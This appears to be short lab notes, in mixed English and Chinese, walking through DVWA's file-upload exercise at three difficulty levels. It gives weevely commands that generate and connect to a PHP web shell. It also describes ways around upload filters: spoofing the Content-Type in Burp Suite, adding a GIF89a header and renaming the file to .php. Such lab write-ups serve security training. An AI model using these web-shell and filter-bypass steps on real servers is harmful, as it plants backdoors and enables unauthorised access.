# Upload Fiole
## Level Low
```bash
# Use weevely generate shell.php
weevely generate 12345 shell.php
# 直接在页面中上传
# 连接到Web Shell
weevely http://127.0.0.1/dvwa/hackabel/uploads/shahazad.php 12345
# use linux command to view file content.
```

## Level Medium Security.
```bash
# 在这个级别不能直接上传php文件，只允许上传图片
# 需要借助Burp Suite进行拦截和修改Content-type为：image/png
```

## Level Hight Security.
```bash
# 直接修改文件后缀名不可直接上传
# We changed extention but it is still not allowing to upload.
# Add this on your shell GIF89a; and change extension.
# Then can success upload file. But we can't run command.
# We can use command rename file to php

```
